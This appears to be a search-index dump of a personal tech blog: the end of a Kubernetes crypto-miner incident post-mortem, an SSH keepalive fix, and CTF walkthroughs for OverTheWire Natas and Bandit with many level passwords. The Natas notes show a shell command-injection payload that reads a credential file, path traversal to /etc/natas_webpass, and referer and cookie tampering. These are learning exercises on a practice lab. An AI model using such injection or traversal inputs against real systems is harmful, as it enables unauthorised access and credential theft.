Clusters","uri":"/posts/kubernetes-crypto-miner/"},{"categories":null,"content":"Consequences of Manual Modifications The oversight of creating a public load balancer open to the world for an internal dashboard is not normal for our team. Our AWS CloudTrail logs showed that Kubernetes initially attached a security group defaulting to 0.0.0.0/0 access to port 80 when the load balancer was created. The security group was then properly configured to block all ingress traffic from non white-listed IPs through a manual edit on the AWS Console. However that voids my claim on how the attack was performed. After pinpointing the deleted load balancer, its CloudTrail history contains the creation date along with a detailed event containing the security group’s identifier. Looking up that security group’s history shows that the manual edit made to firewall off unwanted traffic was reverted by Kubernetes shortly afterward. CloudTrail Logs For Deleted Load Balancers Questions regarding Kubernetes reverting security group edits are present in the project’s GitHub issues. In this particular issue, a Kubernetes contributor explains: …the way Kubernetes works, the ELB is owned by Kubernetes and you should never be forced to modify the resource manually… We normally strictly adhere to the practice of having infrastructure as code and the load balancer should have been defined as internal, or the security group rules should have been defined in our Kubernetes yaml configuration files. In hindsight, a redeploy of Weave Scope would have reverted the manual change and needed to be manually edited back in. ","date":"09-20-2018","objectID":"/posts/kubernetes-crypto-miner/:7:0","tags":null,"title":"How A Cryptocurrency Miner Made Its Way onto Our Internal Kubernetes Clusters","uri":"/posts/kubernetes-crypto-miner/"},{"categories":null,"content":"Recap At JW Player, the DevOps team has frequent code reviews and weekly architectural discussions. Prior to this incident, we had many planning sessions and discussions around upgrading our existing Kubernetes 1.7.4 cluster to 1.10.x. A mix of untimely events and decisions allowed this miner to make its way onto our clusters. We recently migrated to a new Kubernetes version onto a new cluster with different instance sizes. Unprecedented behaviour was expected during this period. Response time to this incident was slightly dulled by untimely alerts for a legitimate service creating noise and almost masking this issue. Some decisions were inherited from older infrastructure and stuck around, such as running containers as the root user. A manual change was made to a Kubernetes managed resource. ","date":"09-20-2018","objectID":"/posts/kubernetes-crypto-miner/:8:0","tags":null,"title":"How A Cryptocurrency Miner Made Its Way onto Our Internal Kubernetes Clusters","uri":"/posts/kubernetes-crypto-miner/"},{"categories":null,"content":"Next Steps Learning from this lesson and moving forward, we have plans in place to harden our security. First, we learned monitoring on load is not the most effective measurement to determine if there is an issue with the Kubernetes clusters. Our first step is to improve alerting and diagnosis by first determining more insightful monitors, then tweaking them to give us assurance that there is, in fact, an anomaly present instead of being dulled to multiple alarms from an influx in workload. To prevent this particular attack and future attacks from happening, we are researching use of tools such as falcon or sysdig for behavioural monitoring, and anomaly and intrusion detection. Istio and Linkerd may be useful in capturing and controlling end to end network traffic to observe and prevent unauthorised access. We are also analysing the computational cost of scanning Docker images and containers for known vulnerabilities. To improve our process as a team, some time in our architectural discussions has been partitioned to revisit choices made in the past such as containers running as root. We also acknowledge that some information has been siloed off to certain team members, and embracing DevOps means this information should be shared. Communication is integral to our team, and being aware of these faults enables us s to make time to shift focus onto giving each engineer more visibility on big projects such as a large scale Kubernetes version migration. ","date":"09-20-2018","objectID":"/posts/kubernetes-crypto-miner/:9:0","tags":null,"title":"How A Cryptocurrency Miner Made Its Way onto Our Internal Kubernetes Clusters","uri":"/posts/kubernetes-crypto-miner/"},{"categories":null,"content":"When using VMWare to do work on my virtual machines, I came across an annoying bug where all my SSH connections failed: $ ssh root@52.172.12.100 packet_write_wait: Connection to 52.172.12.100 port 22: Broken pipe $ git clone git@github.com:bycEEE/bycEEE.github.io.git Cloning into 'bycEEE.github.io'... packet_write_wait: Connection to 192.30.253.113 port 22: Broken pipe fatal: Could not read from remote repository. Please make sure you have the correct access rights and the repository exists. Finally found a discussion on this issue here Modifying ~/.ssh/config fixed my issues: Host * ServerAliveInterval 600 TCPKeepAlive yes IPQoS=throughput ","date":"09-11-2018","objectID":"/posts/vmware-ssh-bug/:0:0","tags":null,"title":"VMWare SSH Bug","uri":"/posts/vmware-ssh-bug/"},{"categories":null,"content":"Following up on my Bandit post, OverTheWire Natas teaches the basics of serverside web-security. These are quick notes for my solutions to level 0-10. I’ll be doing these in preperation for the OSCP pentesting course I plan on taking. ","date":"01-05-2018","objectID":"/posts/overthewire-natas/:0:0","tags":null,"title":"OverTheWire Natas","uri":"/posts/overthewire-natas/"},{"categories":null,"content":"Level 0 The password to this level is listed on the natas game description: Username: natas0 Password: natas0 URL: http://natas0.natas.labs.overthewire.org ","date":"01-05-2018","objectID":"/posts/overthewire-natas/:1:0","tags":null,"title":"OverTheWire Natas","uri":"/posts/overthewire-natas/"},{"categories":null,"content":"Level 0 -\u003e 1 Viewing the source code reveals a commented line containing the password for the next level. \u003cdiv id=\"content\"\u003e You can find the password for the next level on this page. \u003c!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto --\u003e \u003c/div\u003e ","date":"01-05-2018","objectID":"/posts/overthewire-natas/:2:0","tags":null,"title":"OverTheWire Natas","uri":"/posts/overthewire-natas/"},{"categories":null,"content":"Level 1 -\u003e 2 Viewing the source again reveals the password for the next level. You can bypass the right click block with keyboard shortcuts. \u003cdiv id=\"content\"\u003e You can find the password for the next level on this page, but rightclicking has been blocked! \u003c!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi --\u003e \u003c/div\u003e ","date":"01-05-2018","objectID":"/posts/overthewire-natas/:3:0","tags":null,"title":"OverTheWire Natas","uri":"/posts/overthewire-natas/"},{"categories":null,"content":"Level 2 -\u003e 3 The following line in the source reveals that a directory ‘files’ exists. \u003cdiv id=\"content\"\u003e There is nothing on this page \u003cimg src=\"files/pixel.png\" /\u003e \u003c/div\u003e Checking out the ‘files’ directory at http://natas2.natas.labs.overthewire.org/files/ reveals that there is also a users.txt file containing the credentials for the next level. # username:password alice:BYNdCesZqW bob:jw2ueICLvT charlie:G5vCxkVV3m natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 eve:zo4mJWyNj2 mallory:9urtcpzBmH ","date":"01-05-2018","objectID":"/posts/overthewire-natas/:4:0","tags":null,"title":"OverTheWire Natas","uri":"/posts/overthewire-natas/"},{"categories":null,"content":"Level 3 -\u003e 4 The source drops a hint that there is a robots.txt file blocking Google from crawling. \u003cdiv id=\"content\"\u003e There is nothing on this page \u003c!-- No more information leaks!! Not even Google will find it this time... --\u003e \u003c/div\u003e robots.txt contains: User-agent: * Disallow: /s3cr3t/ This blocks the ‘s3cr3t’ directory from being crawled, and also tells me that this directory may exist. Navigating to http://natas3.natas.labs.overthewire.org/s3cr3t reveals that user.txt exists and it contains the credentials for the next level. natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ ","date":"01-05-2018","objectID":"/posts/overthewire-natas/:5:0","tags":null,"title":"OverTheWire Natas","uri":"/posts/overthewire-natas/"},{"categories":null,"content":"Level 4 -\u003e 5 The source shows nothing of interest and the message displayed on the page gives me a huge hint to move foward. Access disallowed. You are visiting from \"\" while authorized users should come only from “http://natas5.natas.labs.overthewire.org/\" I suspect that I would have to modify my request to the natas4 page and set natas5 as my referrer. To do this I downloaded a Firefox plugin called Tamper Data. Tamper Data Using Tamper Data I’m able to interept my request and change the referral to come from http://natas5.natas.labs.overthewire.org/. Upon modifying the request, I’m greeted with the password for the next level. Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq ## Level 5 -\u003e 6 After logging in I get this error: ```text Access disallowed. You are not logged in I decided to fire up Tamper Data again and poke around to see I can find something wrong with the cookie sent. Tamper Data Cookie Field Looks like there’s a parameter setting ’loggedin’ to 0. Changing this to 1 gives me the password to the next level. Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 ","date":"01-05-2018","objectID":"/posts/overthewire-natas/:6:0","tags":null,"title":"OverTheWire Natas","uri":"/posts/overthewire-natas/"},{"categories":null,"content":"Level 6 -\u003e 7 Viewing the source gives me a clue to check out ‘inclues/secret.inc’ \u003c? include \"includes/secret.inc\"; if(array_key_exists(\"submit\", $_POST)) { if($secret == $_POST['secret']) { print \"Access granted. The password for natas7 is \u003ccensored\u003e\"; } else { print \"Wrong secret\"; } } ?\u003e The ‘includes/secret.inc’ file gives me a secret key, which when submitted gives me the next password. \u003c? $secret = \"FOEIUWGHFEEUHOFUOIU\"; ?\u003e Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 ","date":"01-05-2018","objectID":"/posts/overthewire-natas/:7:0","tags":null,"title":"OverTheWire Natas","uri":"/posts/overthewire-natas/"},{"categories":null,"content":"Level 7 -\u003e 8 The page source shows: \u003cdiv id=\"content\"\u003e \u003ca href=\"index.php?page=home\"\u003eHome\u003c/a\u003e \u003ca href=\"index.php?page=about\"\u003eAbout\u003c/a\u003e \u003cbr /\u003e \u003cbr /\u003e \u003c!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 --\u003e \u003c/div\u003e There are also 2 links to a ‘Home’ and ‘About’ page which show more or less the same thing. I noticed the URL routed to http://natas7.natas.labs.overthewire.org/index.php?page=home and when typing in a non-existant route, I get the following error: Warning: include(test): failed to open stream: No such file or directory in /var/www/natas/natas7/index.php on line 21 Warning: include(): Failed opening 'test' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/natas/natas7/index.php on line 21 Turns out this page is vulnerable to a path traversal attack. Accessing http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8 reveals the next level’s password. DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe ","date":"01-05-2018","objectID":"/posts/overthewire-natas/:8:0","tags":null,"title":"OverTheWire Natas","uri":"/posts/overthewire-natas/"},{"categories":null,"content":"Level 8 -\u003e 9 The source code shows: \u003c? $encodedSecret = \"3d3d516343746d4d6d6c315669563362\"; function encodeSecret($secret) { return bin2hex(strrev(base64_encode($secret))); } if(array_key_exists(\"submit\", $_POST)) { if(encodeSecret($_POST['secret']) == $encodedSecret) { print \"Access granted. The password for natas9 is \u003ccensored\u003e\"; } else { print \"Wrong secret\"; } } ?\u003e All we have to do for this level is reverse the function encodeSecret. root@kali:~# php -a Interactive mode enabled php \u003e echo base64_decode(strrev(hex2bin('3d3d516343746d4d6d6c315669563362'))); oubWYf2kBq Submitting the secret gives us the next password. Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl ","date":"01-05-2018","objectID":"/posts/overthewire-natas/:9:0","tags":null,"title":"OverTheWire Natas","uri":"/posts/overthewire-natas/"},{"categories":null,"content":"Level 9 -\u003e 10 Source: \u003cpre\u003e \u003c? $key = \"\"; if(array_key_exists(\"needle\", $_REQUEST)) { $key = $_REQUEST[\"needle\"]; } if($key != \"\") { passthru(\"grep -i $key dictionary.txt\"); } ?\u003e \u003c/pre\u003e I don’t program in PHP so I looked up the passthru command: The passthru() function is similar to the exec() function in that it executes a command. This function should be used in place of exec() or system() when the output from the Unix command is binary data which needs to be passed directly back to the browser. A common use for this is to execute something like the pbmplus utilities that can output an image stream directly. By setting the Content-type to image/gif and then calling a pbmplus program to output a gif, you can create PHP scripts that output images directly. It looks to me I can pass commands in the form box and it’ll replace $key. Since inputs aren’t sanitised and the introductory natas challenge page states that all passwords are also stored in /etc/natas_webpass, I’m able input the following command to print out the password for the next level: ; cat /etc/natas_webpass/natas10 # By doing this, $key is substituted in with my command, causing grep to end prematurely and commenting out ‘dictionary.txt’ at the end. grep -i ; cat /etc/natas_webpass/natas10 # dictionary.txt Output: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu ","date":"01-05-2018","objectID":"/posts/overthewire-natas/:10:0","tags":null,"title":"OverTheWire Natas","uri":"/posts/overthewire-natas/"},{"categories":null,"content":"Level 10 -\u003e 11 \u003cpre\u003e \u003c? $key = \"\"; if(array_key_exists(\"needle\", $_REQUEST)) { $key = $_REQUEST[\"needle\"]; } if($key != \"\") { if(preg_match('/[;|\u0026]/',$key)) { print \"Input contains an illegal character!\"; } else { passthru(\"grep -i $key dictionary.txt\"); } } ?\u003e \u003c/pre\u003e This time there’s some sanitasion for my input. I’m now unable to terminate my command using ;. However, the same substituion issue exists where I can instead pass along a different command. . and * are permitted characters, so I’m able to use grep’s ability to do a wildcard search on a specific file. .* /etc/natas_webpass/natas11 # Substituted: grep -i .* /etc/natas_webpass/natas11 # dictionary.txt The form then returns the next level’s password. .htaccess:AuthType Basic .htaccess: AuthName \"Authentication required\" .htaccess: AuthUserFile /var/www/natas/natas10//.htpasswd .htaccess: require valid-user .htpasswd:natas10:$1$XOXwo/z0$K/6kBzbw4cQ5exEWpW5OV0 /etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK ","date":"01-05-2018","objectID":"/posts/overthewire-natas/:11:0","tags":null,"title":"OverTheWire Natas","uri":"/posts/overthewire-natas/"},{"categories":null,"content":"OverTheWire Bandit is a capture the flag (CTF) game for beginners. I’ve recently regained interest in security and found this a fun way to get back into what originally led me to learn programming. These are quick notes for my solutions on level 0-27. ","date":"12-26-2017","objectID":"/posts/overthewire-bandit/:0:0","tags":null,"title":"OverTheWire Bandit","uri":"/posts/overthewire-bandit/"},{"categories":null,"content":"Level 0 -\u003e Level 1 The password for the next level is stored in a file called readme located in the home directory. Use this password to log into bandit1 using SSH. Whenever you find a password for a level, use SSH (on port 2220) to log into that level and continue the game. → ssh bandit.labs.overthewire.org -p 2220 -l bandit0 bandit0@bandit:~$ ls -al total 24 drwxr-xr-x 2 root root 4096 Nov 13 15:58 . drwxr-xr-x 29 root root 4096 Nov 13 15:57 .. -rw-r--r-- 1 root root 220 Sep 1 2015 .bash_logout -rw-r--r-- 1 root root 3771 Sep 1 2015 .bashrc -rw-r--r-- 1 root root 655 Jun 24 2016 .profile -rw-r----- 1 bandit1 bandit0 33 Nov 13 15:58 readme bandit0@bandit:~$ cat readme boJ9jbbUNNfktd78OOpsqOltutMc3MY1 ","date":"12-26-2017","objectID":"/posts/overthewire-bandit/:1:0","tags":null,"title":"OverTheWire Bandit","uri":"/posts/overthewire-bandit/"},{"categories":null,"content":"Level 1 -\u003e Level 2 The password for the next level is stored in a file called - located in the home directory. bandit1@bandit:~$ cat ./- CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9 ","date":"12-26-2017","objectID":"/posts/overthewire-bandit/:2:0","tags":null,"title":"OverTheWire Bandit","uri":"/posts/overthewire-bandit/"},{"categories":null,"content":"Level 2 -\u003e Level 3 The password for the next level is stored in a file called spaces in this filename located in the home directory. bandit2@bandit:~$ cat spaces\\ in\\ this\\ filename UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK ","date":"12-26-2017","objectID":"/posts/overthewire-bandit/:3:0","tags":null,"title":"OverTheWire Bandit","uri":"/posts/overthewire-bandit/"},{"categories":null,"content":"Level 3 -\u003e Level 4 The password for the next level is stored in a hidden file in the inhere directory. bandit3@bandit:~$ cd inhere bandit3@bandit:~/inhere$ ls -al total 12 drwxr-xr-x 2 root root 4096 Nov 13 15:58 . drwxr-xr-x 3 root root 4096 Nov 13 15:58 .. -rw-r----- 1 bandit4 bandit3 33 Nov 13 15:58 .hidden bandit3@bandit:~/inhere$ cat .hidden pIwrPrtPN36QITSp3EQaw936yaFoFgAB ","date":"12-26-2017","objectID":"/posts/overthewire-bandit/:4:0","tags":null,"title":"OverTheWire Bandit","uri":"/posts/overthewire-bandit/"},{"categories":null,"content":"Level 4 -\u003e Level 5 The password for the next level is stored in the only human-readable file in the inhere directory. Tip: if your terminal is messed up, try the “reset” command. I decided to use the file command to determine which files are human-readable. bandit4@bandit:~/inhere$ file ./* ./-file00: data ./-file01: data ./-file02: data ./-file03: data ./-file04: data ./-file05: data ./-file06: data ./-file07: ASCII text ./-file08: data ./-file09: data bandit4@bandit:~/inhere$ file ./* | grep \"ASCII text\" ./-file07: ASCII text bandit4@bandit:~/inhere$ ls -al total 48 -rw-r----- 1 bandit5 bandit4 33 Nov 13 15:58 -file00 -rw-r----- 1 bandit5 bandit4 33 Nov 13 15:58 -file01 -rw-r----- 1 bandit5 bandit4 33 Nov 13 15:58 -file02 -rw-r----- 1 bandit5 bandit4 33 Nov 13 15:58 -file03 -rw-r----- 1 bandit5 bandit4 33 Nov 13 15:58 -file04 -rw-r----- 1 bandit5 bandit4 33 Nov 13 15:58 -file05 -rw-r----- 1 bandit5 bandit4 33 Nov 13 15:58 -file06 -rw-r----- 1 bandit5 bandit4 33 Nov 13 15:58 -file07 -rw-r----- 1 bandit5 bandit4 33 Nov 13 15:58 -file08 -rw-r----- 1 bandit5 bandit4 33 Nov 13 15:58 -file09 drwxr-xr-x 2 root root 4096 Nov 13 15:58 . drwxr-xr-x 3 root root 4096 Nov 13 15:58 .. bandit4@bandit:~/inhere$ file ./* | grep \"ASCII text\" ./-file07: ASCII text bandit4@bandit:~/inhere$ cat ./-file07 koReBOKuIDDepwhWk7jZC0RTdopnAYKh ","date":"12-26-2017","objectID":"/posts/overthewire-bandit/:5:0","tags":null,"title":"OverTheWire Bandit","uri":"/posts/overthewire-bandit/"},{"categories":null,"content":"Level 5 -\u003e Level 6 The password for the next level is stored in a file somewhere under the inhere directory and has all of the following properties: human-readable 1033 bytes in size not executable I looked for files with size 1033 bytes that are not executable. Since I only returned one output, I’m able to check to see if it’s human-readable using cat. bandit5@bandit:~$ find . -type f -size 1033c ! -executable ./inhere/maybehere07/.file2 bandit5@bandit:~$ cat ./inhere/maybehere07/.file2 DXjZPULLxYr17uwoI01bNLQbtFemEgo7 ","date":"12-26-2017","objectID":"/posts/overthewire-bandit/:6:0","tags":null,"title":"OverTheWire Bandit","uri":"/posts/overthewire-bandit/"},{"categories":null,"content":"Level 6 -\u003e Level 7 The password for the next level is stored somewhere on the server and has all of the following properties: owned by user bandit7 owned by group bandit6 33 bytes in size Using find again with the arguments that fit the above requirements. I routed all STDERR outputs to /dev/null for a cleaner output. bandit6@bandit:~$ find / -user bandit7 -group bandit6 -size 33c 2\u003e/dev/null /var/lib/dpkg/info/bandit7.password ","date":"12-26-2017","objectID":"/posts/overthewire-bandit/:7:0","tags":null,"title":"OverTheWire Bandit","uri":"/posts/overthewire-bandit/"},{"categories":null,"content":"Level 7 -\u003e Level 8 The password for the next level is stored in the file data.txt next to the word millionth. Using grep to see what the file looks like around the word ‘millionth’. Once I had a sense of how the file is structured, I used awk to get my desired output. bandit7@bandit:~$ grep -C 3 millionth data.txt go vilygVSBNRzRXSZFzIeSbajhHHRrjgln controversially p1JE4gkWuFxTpk55Zfo3xqLe3RqhWtHX conspiracies tbkj5iLjadNfPTCslAvnU9nyFeHBfu1o millionth cvX2JJa4CFALtqS87jk27qwqGhBM9plV wardrooms ERG4eyK8q5eIP554LQysscc5oQuEGV8c admissions 4vOZpSuzFUMNqJtrXVcNaheXuGDbrPCo wearying kS75kziqMp5mUopzJTKaJRf0SIBDWLGf bandit7@bandit:~$ awk '/millionth/ {print $2}' data.txt cvX2JJa4CFALtqS87jk27qwqGhBM9plV ","date":"12-26-2017","objectID":"/posts/overthewire-bandit/:8:0","tags":null,"title":"OverTheWire Bandit","uri":"/posts/overthewire-bandit/"},{"categories":null,"content":"Level 8 -\u003e Level 9 The password for the next level is stored in the file data.txt and is the only line of text that occurs only once. bandit8@bandit:~$ cat data.txt | sort | uniq -u UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR ","date":"12-26-2017","objectID":"/posts/overthewire-bandit/:9:0","tags":null,"title":"OverTheWire Bandit","uri":"/posts/overthewire-bandit/"},{"categories":null,"content":"Level 9 -\u003e Level 10 The password for the next level is stored in the file data.txt in one of the few human-readable strings, beginning with several ‘=’ characters. strings prints out human-readable strings. My initial output using regex filtering was missing the password, so I used a simpler search. bandit9@bandit:~$ strings data.txt | grep -e \"^[=+]\" ========== theOkM =hrV` ========== password ========== is +3CMz =GUl +xOU =/wW bandit9@bandit:~$ strings data.txt | grep = ========== theOkM L=8@ =hrV` ========== password ========== is H)=QU \u003e]\".x= {=u/,i_ {=jh =GUl e=y: 4H5= )========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk =/wW ~BX= ","date":"12-26-2017","objectID":"/posts/overthewire-bandit/:10:0","tags":null,"title":"OverTheWire Bandit","uri":"/posts/overthewire-bandit/"},{"categories":null,"content":"Level 10 -\u003e Level 11 The password for the next level is stored in the file data.txt, which contains base64 encoded data. bandit10@bandit:~$ base64 -d data.txt The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR ","date":"12-26-2017","objectID":"/posts/overthewire-bandit/:11:0","tags":null,"title":"OverTheWire Bandit","uri":"/posts/overthewire-bandit/"},{"categories":null,"content":"Level 11 -\u003e Level 12 The password for the next level is stored in the file data.txt, where all lowercase (a-z) and uppercase (A-Z) letters have been rotated by 13 positions. [https://en.wikipedia.org/wiki/ROT13]ROT13(https://en.wikipedia.org/wiki/ROT13) is a simple cipher where you rotate 13 places. I used tr to shift my text by 13 letters. bandit11@bandit:~$ cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m' The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu ","date":"12-26-2017","objectID":"/posts/overthewire-bandit/:12:0","tags":null,"title":"OverTheWire Bandit","uri":"/posts/overthewire-bandit/"},{"categories":null,"content":"Level 12 -\u003e Level 13 The password for the next level is stored in the file data.txt, which is a hexdump of a file that has been repeatedly compressed. For this level it may be useful to create a directory under /tmp in which you can work using mkdir. For example: mkdir /tmp/myname123. Then copy the datafile using cp, and rename it using mv (read the manpages!) As recommended, I created a new directory and copied the file to it. bandit12@bandit:~$ mkdir /tmp/bandit12data bandit12@bandit:~$ cp data.txt /tmp/bandit12data bandit12@bandit:~$ cd /tmp/bandit12data Since this is a hexdump, I used xxd to convert it back to the original binary. then checked its file type. bandit12@bandit:/tmp/bandit12data$ xxd -r data.txt data.orig bandit12@bandit:/tmp/bandit12data$ file data.orig data.orig: gzip compressed data, was \"data2.bin\", last modified: Mon Nov 13 14:58:07 2017, max compression, from Unix For gzip, I used zcat to output the decompressed file to one with the original name since I did not want to continually change the suffix. I then check the file information to see what it was compressed with and used the corresponding tool to decompress. Many decompressions later… bandit12@bandit:/tmp/bandit12data$ gzip -d data.orig gzip: data.orig: unknown suffix -- ignored bandit12@bandit:/tmp/bandit12data$ zcat data.orig \u003e data2.bin bandit12@bandit:/tmp/bandit12data$ file data2.bin data2.bin: bzip2 compressed data, block size = 900k bandit12@bandit:/tmp/bandit12data$ bzip2 -d data2.bin bzip2: Can't guess original name for data2.bin -- using data2.bin.out bandit12@bandit:/tmp/bandit12data$ file data2.bin.out data2.bin.out: gzip compressed data, was \"data4.bin\", last modified: Mon Nov 13 14:58:07 2017, max compression, from Unix bandit12@bandit:/tmp/bandit12data$ zcat data2.bin.out \u003e data4.bin bandit12@bandit:/tmp/bandit12data$ file data4.bin data4.bin: POSIX tar archive (GNU) bandit12@bandit:/tmp/bandit12data$ tar -xvf data4.bin data5.bin bandit12@bandit:/tmp/bandit12data$ file data5.bin data5.bin: POSIX tar archive (GNU) bandit12@bandit:/tmp/bandit12data$ tar -xvf data5.bin data6.bin bandit12@bandit:/tmp/bandit12data$ file data6.bin data6.bin: bzip2 compressed data, block size = 900k bandit12@bandit:/tmp/bandit12data$ bzip2 -d data6.bin bzip2: Can't guess original name for data6.bin -- using data6.bin.out bandit12@bandit:/tmp/bandit12data$ file data6.bin.out data6.bin.out: POSIX tar archive (GNU) bandit12@bandit:/tmp/bandit12data$ tar -xvf data6.bin.out data8.bin bandit12@bandit:/tmp/bandit12data$ file data8.bin data8.bin: gzip compressed data, was \"data9.bin\", last modified: Mon Nov 13 14:58:07 2017, max compression, from Unix bandit12@bandit:/tmp/bandit12data$ zcat data8.bin \u003e data9.bin bandit12@bandit:/tmp/bandit12data$ file data9.bin data9.bin: ASCII text bandit12@bandit:/tmp/bandit12data$ cat data9.bin The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL ","date":"12-26-2017","objectID":"/posts/overthewire-bandit/:13:0","tags":null,"title":"OverTheWire Bandit","uri":"/posts/overthewire-bandit/"},{"categories":null,"content":"Level 13 -\u003e Level 14 The password for the next level is stored in /etc/bandit_pass/bandit14 and can only be read by user bandit14. For this level, you don’t get the next password, but you get a private SSH key that can be used to log into the next level. Note: localhost is a hostname that refers to the machine you are working on. bandit13@bandit:~$ ls -al total 24 drwxr-xr-x 2 root root 4096 Nov 13 15:58 . drwxr-xr-x 29 root root 4096 Nov 13 15:57 .. -rw-r--r-- 1 root root 220 Sep 1 2015 .bash_logout -rw-r--r-- 1 root root 3771 Sep 1 2015 .bashrc -rw-r--r-- 1 root root 655 Jun 24 2016 .profile -rw-r----- 1 bandit14 bandit13 1679 Nov 13 15:58 sshkey.private bandit13@bandit:~$ cat sshkey.private [REDACTED] bandit13@bandit:~$ ssh -i sshkey.private bandit14@localhost bandit14@bandit:~$ cat /etc/bandit_pass/bandit14 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e ","date":"12-26-2017","objectID":"/posts/overthewire-bandit/:14:0","tags":null,"title":"OverTheWire Bandit","uri":"/posts/overthewire-bandit/"},{"categories":null,"content":"Level 14 -\u003e Level 15 The password for the next level can be retrieved by submitting the password of the current level to port 30000 on localhost. bandit14@bandit:~$ telnet localhost 30000 Trying ::1... Trying 127.0.0.1... Connected to localhost. Escape character is '^]'. 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e Correct! BfMYroe26WYalil77FoDi9qh59eK5xNr Connection closed by foreign host. ","date":"12-26-2017","objectID":"/posts/overthewire-bandit/:15:0","tags":null,"title":"OverTheWire Bandit","uri":"/posts/overthewire-bandit/"},{"categories":null,"content":"Level 15 -\u003e Level 16 The password for the next level can be retrieved by submitting the password of the current level to port 30001 on localhost using SSL encryption. bandit15@bandit:~$ openssl s_client -connect localhost:30001 -ign_eof CONNECTED(00000003) depth=0 CN = bandit verify error:num=18:self signed certificate verify return:1 depth=0 CN = bandit verify return:1 --- Certificate chain 0 s:/CN=bandit i:/CN=bandit --- Server certificate -----BEGIN CERTIFICATE----- MIICsjCCAZqgAwIBAgIJAOiKeDKsXb/8MA0GCSqGSIb3DQEBCwUAMBExDzANBgNV BAMMBmJhbmRpdDAeFw0xNzExMTEyMDA1MTJaFw0yNzExMDkyMDA1MTJaMBExDzAN BgNVBAMMBmJhbmRpdDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAM94 fvfAy+PhF9WCKwCmMccdSooUfl2xTxwJ7l6tE9/uMc43CeCskmUhp6B5VQB5yVqs nLBmDpBaDN66XqlzGTyB9gEDELOtYsX20Y48Sd7t/OY3xSV/uIkv+hU10lKSMPd/ khxVjoVdebWoTJkwOz6HX0AvaTbDSRG6oBJ4m99ssNZXGymDjENXESkNeOuxKkGH wIlb6oNLdNTnVWcDtQF6bIofS8v6dRHykKekQ4y9ml7/FzhQJlTMymfSo48GgbNf PWs8KMHMoCSs9byWXHs5OUScqXdC6aC7onRNODSv1/gZiwBFIjvq8+nlj7P8XgTy OqsPvIz+FAS8EvcXH0cCAwEAAaMNMAswCQYDVR0TBAIwADANBgkqhkiG9w0BAQsF AAOCAQEAxD1vr08ahuVDmr3/CHuQUX7w/K3pevWJcjh8xd3Zxbv4WdIEXMrIBMHI lcmTW2z7ZqcEfnCgbqWjY7Dy1N1JN7fvkUDpJhEdYPzdr6XHlSAO+oqEy27J94xl a8hwBJg+euFrJ5jwIU7hZqsEWppNm0uZofSlOWcue3q7V8e7dcJWo6lArPjtMWWD DG2DPDNBIuWktcrQj6eT28Voxjn6iM2ivUWJqsvFSpQ/xwionp8A3ZfiagJKGt/C 4I1QAOqIGVLqOCP+vAjB2utsRP51vXxAeEDu/3hE9Azk/Ap0Z3Nb8XrLSNyfUUm/ oi8cAsr0CunA8qK/B6cVEHm6837xIQ== -----END CERTIFICATE----- subject=/CN=bandit issuer=/CN=bandit --- No client certificate CA names sent --- SSL handshake has read 1015 bytes and written 631 bytes --- New, TLSv1/SSLv3, Cipher is AES128-SHA Server public key is 2048 bit Secure Renegotiation IS supported Compression: NONE Expansion: NONE No ALPN negotiated SSL-Session: Protocol : TLSv1 Cipher : AES128-SHA Session-ID: 36C277A25E05CBC7F1B468EBD5A4CACE1D5EF117F89E78CBAB122B3EF8A1DD23 Session-ID-ctx: Master-Key: C72B2568A031FC5C3773DA8386058F770C0CEDDB70A5878FC232C9DA8C0F510F45F70D96913F7AFABB7DC4684CAA2B35 Key-Arg : None PSK identity: None PSK identity hint: None SRP username: None TLS session ticket lifetime hint: 7200 (seconds) TLS session ticket: 0000 - 8d 8d 08 76 bd 8b dc 4e-f1 f1 6b ed 03 44 22 c5 ...v...N..k..D\". 0010 - a2 c4 d0 9a de fa 4b 9f-a3 df 92 4a 73 f0 08 6d ......K....Js..m 0020 - c0 51 85 d0 51 84 30 b5-e7 57 fb c5 fd be 04 2a .Q..Q.0..W.....* 0030 - 31 63 59 03 9a ac b8 b5-ce 82 78 72 67 d7 63 78 1cY.......xrg.cx 0040 - d6 93 b1 c5 4a de 52 de-91 6c 28 03 f6 aa 86 06 ....J.R..l(..... 0050 - b8 5f 1e 09 52 be a0 21-92 f4 a6 01 05 fd ca e2 ._..R..!........ 0060 - 36 b7 26 28 6c 1a 75 98-b4 12 5d 18 d6 43 52 e7 6.\u0026(l.u...]..CR. 0070 - a5 22 bc d4 36 a1 49 da-c7 7f db a7 5d ed 2c 7a .\"..6.I.....].,z 0080 - 87 c1 53 88 75 51 2b 0a-36 d5 03 69 b3 13 f1 f1 ..S.uQ+.6..i.... 0090 - ee 73 6e ca 2a 9d 8a 26-ae b5 20 8b 71 f9 09 06 .sn.*..\u0026.. .q... Start Time: 1514325241 Timeout : 300 (sec) Verify return code: 18 (self signed certificate) --- BfMYroe26WYalil77FoDi9qh59eK5xNr Correct! cluFn7wTiGryunymYOu4RcffSxQluehd closed 